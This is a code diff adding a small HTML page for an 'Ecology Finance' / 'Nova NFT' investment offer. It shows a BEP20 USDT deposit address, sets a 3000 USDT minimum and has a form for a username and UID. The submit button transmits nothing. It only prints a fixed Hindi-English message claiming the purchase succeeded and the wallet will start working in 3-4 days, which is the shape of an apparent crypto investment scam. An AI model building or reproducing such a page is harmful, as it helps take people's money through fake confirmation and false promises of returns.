@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Nova NFT - Ecology Finance</title>
+
+<style>
+
+body{
+background:black;
+color:white;
+font-family:Arial;
+text-align:center;
+}
+
+.container{
+width:380px;
+margin:auto;
+padding:20px;
+}
+
+img{
+width:100%;
+border-radius:10px;
+}
+
+button{
+background:gold;
+color:black;
+padding:12px 25px;
+border:none;
+border-radius:8px;
+font-size:18px;
+margin-top:20px;
+cursor:pointer;
+}
+
+input{
+width:90%;
+padding:10px;
+margin:10px;
+border-radius:5px;
+border:none;
+}
+
+.address{
+background:#111;
+padding:12px;
+border-radius:5px;
+margin-top:10px;
+word-break:break-all;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<img src="ecology.png">
+
+<h2>Ecology Finance</h2>
+
+<p>Minimum purchase: <b>3000 USDT</b></p>
+
+<button onclick="showInvest()">Invest Now</button>
+
+<div id="invest" style="display:none">
+
+<p>BEP20 USDT Deposit Address</p>
+
+<div class="address">
+0xcc24EC6c4E82CA8c0D1f96C71E149a030a4663B8
+</div>
+
+<input type="text" placeholder="Enter Username">
+
+<input type="text" placeholder="Enter UID">
+
+<button onclick="submitForm()">Submit</button>
+
+</div>
+
+<p id="msg"></p>
+
+</div>
+
+<script>
+
+function showInvest(){
+document.getElementById("invest").style.display="block";
+}
+
+function submitForm(){
+document.getElementById("msg").innerHTML="Successfully! Ecology Buy ho chuki hai. 3-4 days ke andar update ho kar wallet me working start ho jayegi.";
+}
+
+</script>
+
+</body>
+</html>
